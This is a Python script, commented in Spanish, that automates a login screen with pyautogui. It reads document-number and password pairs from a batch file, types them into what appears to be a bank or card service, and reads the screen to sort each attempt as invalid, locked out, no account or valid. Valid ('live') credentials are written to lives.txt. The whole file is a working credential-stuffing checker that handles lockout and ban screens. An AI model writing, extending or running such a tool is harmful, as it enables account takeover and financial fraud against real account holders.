import pyautogui as p
import time
#import os
from PIL import Image
#from pytesseract import pytesseract
#from printy import printy

DEATH_1 = "./imagenes/death_1.png"
DEATH_2 = "./imagenes/death_2.png"
VALIDAR_1 = "./imagenes/validar_1.png"
VALIDAR_2 = './imagenes/validar_2.png'
BAN = './imagenes/ban.png'
LIVE = './imagenes/live.png'
      
IngresarNumDocumento =  890,386
IngresarNumDocumentoMedio = 771,390
def borrar():
    for _ in range(10):
        p.press('backspace')
def borrarDocumento():
    #time.sleep(1)
    #p.click(IngresarNumDocumento)
    p.doubleClick(IngresarNumDocumentoMedio) 
    #p.typewrite('1231231')
    #p.hotkey('ctrl', 'backspace')
    #for _ in range(10):
    #    p.press('backspace')

def verificarBAN(BAN,bansito):
    bansito = p.locateOnScreen(BAN, grayscale=True, confidence=0.9, region=(684,312,1249,736))
    #print(f"bansito: {bansito}")
    if bansito!=None:
        input("ban")
        return True
    

def procesar_lote():
    linealote = 0
    with open('./lote.txt', 'r') as f:
        lines = f.readlines()

    for line in lines:
        linealote += 1
        values = line.strip().split(' ')
        valor1 = values[0]
        valor2 = values[1].zfill(8)
        print(f"Valor 1: {valor1} / / Valor 2: {valor2}")
        
        time.sleep(0.1)
        p.doubleClick(IngresarNumDocumentoMedio) # para ingresar el numero del documento
        p.typewrite(valor1, interval=0.02)
        time.sleep(0.2) 
        p.click(944,516)    #Click en continuar
        
        #Verificar 
        rojo =  False
        d1 = None
        v1= None
        v2 = None
        live = None
        bansito = None

        time.sleep(0.5)
        
        while True:
            time.sleep(0.1)
            
            #Verificar si es BAN
            if verificarBAN(BAN,bansito):
                break
            
            #Acceso contrasena
            rojo = p.pixelMatchesColor(774,250,(236,17,26))
            #print(f"rojo: {rojo}")
            if rojo is True:      # Deja poner la contrasena 
                p.click(1011,366) #Click en el lugar del contrasena
                time.sleep(0.1)
                p.typewrite(valor2, interval=0.02) # escirbir la pass
                time.sleep(0.1)
                p.click(951,565) # click en iniciar sesion
                
                #Verificar si es valido o no
                while (v1 is None) and (v2 is None):
                    time.sleep(0.1)
                    p.moveTo(1012,76)
                    
                    if verificarBAN(BAN,bansito):
                        break
                    
                    v1 = p.locateOnScreen(VALIDAR_1, grayscale=True, confidence=0.9, region=(706,475,1207,623))
                    #print(f"v1: {v1}")
                    if v1!=None:
                        print("Documento o contrasena invalida")
                        time.sleep(0.2)
                        p.click(1129,582) # Click en aceptar
                        time.sleep(0.2)
                        p.press('esc') # para salir al menu principal
                        time.sleep(0.3)
                        break    
                    
                    v2 = p.locateOnScreen(VALIDAR_2, grayscale=True, confidence=0.9, region=(695,419,1213,669))
                    #print(f"v2: {v2}")
                    if v2!=None:
                        print("Usuario bloqueado, Has superado el numero de intentos permitidos")
                        time.sleep(0.2)
                        p.click(1019,620) # Click en cancelar
                        time.sleep(0.2)
                        p.press('esc') # para salir al menu principal
                        time.sleep(0.3)
                        break
                    
                    #LIVE
                    live = p.locateOnScreen(LIVE, grayscale=True, confidence=0.9, region=(673,130,1229,452))
                    #print(f"live: {live}")
                    if live!=None:
                        print("LIVE > > > > ")
                        time.sleep(0.2)
                        p.click(714,105) # Click para retroceder
                        time.sleep(0.2)
                        p.press('esc') # para salir al menu principal
                        time.sleep(0.3)
                        
                        lives = open("lives.txt","a")
                        lives.write(f"Valor 1: {valor1} / / Valor 2: {valor2}".rstrip()) # escribir en el block
                        lives.write("\n")
                        lives.close()
                        break  
                break

            #DEATH 1 > > > INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )
            d1 = p.locateOnScreen(DEATH_1, grayscale=True, region=(683,48,1233,120))
            #print(f"d1: {d1}")
            if d1!=None:
                print("INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )")
                time.sleep(0.1)
                p.click(712,107) # click en para atras para retroceder
                time.sleep(0.3)
                break
            
            # DEATH 2 > > > No tienes cuenta con nosotros
            d2 = p.locateOnScreen(DEATH_2, grayscale=True, region=(685,502,1242,740)) #grande imagen
            #print(f"d1: {d1}")
            if d2!=None:
                print("No tienes cuenta con nosotros")
                time.sleep(0.1)
                p.click(988,613) # Click en ahora NO para retroceder
                time.sleep(0.3)
                break
            
    

if __name__ == "__main__":
    time.sleep(1)
    procesar_lote()
    #borrarDocumento()